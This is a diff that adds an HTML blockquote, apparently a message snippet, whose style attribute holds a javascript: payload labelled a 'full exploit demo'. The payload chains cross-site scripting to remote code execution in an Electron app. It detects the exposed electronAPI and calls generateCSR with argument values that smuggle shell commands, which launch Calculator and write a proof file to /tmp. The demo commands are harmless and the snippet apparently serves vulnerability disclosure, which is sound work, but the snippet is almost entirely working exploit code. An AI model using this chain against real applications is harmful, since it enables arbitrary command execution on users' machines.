@@ -1,0 +1,7 @@
+<blockquote data-slack="true">
+  <div style="background:url('javascript:(async function exploitChain(){if(typeof window.electronAPI===\"undefined\"){alert(\"⚠️ Open in Electron App\");return}const log=(m)=>console.log(\"[XSS→RCE]\",m);try{log(\"Stage 1: Electron
+  detected\");log(\"Available APIs: \"+Object.keys(window.electronAPI).join(\", \"));log(\"Stage 2: Executing command injection\");const calcCmd=\"\\\"; open -a Calculator; echo \\\"\";await
+  window.electronAPI.generateCSR(\"demo\",calcCmd);log(\"Stage 3: Calculator launched\");log(\"Stage 4: Creating proof file\");const proofCmd=\"\\\"; echo PWNED > /tmp/xss-to-rce-proof.txt; echo \\\"\";await
+  window.electronAPI.generateCSR(\"proof\",proofCmd);log(\"Stage 5: Success!\");alert(\"✅ Full XSS to RCE chain successful!\\n\\n✓ Calculator opened\\n✓ Proof file: /tmp/xss-to-rce-proof.txt\\n\\nThis demonstrates:\\n- XSS via style
+  attribute\\n- Access to Electron IPC\\n- Command injection (VULN-01)\\n- Remote code execution\")}catch(e){alert(\"Error: \"+e.message);console.error(e)}})()')">🎯 FULL EXPLOIT DEMO</div>
+  </blockquote>
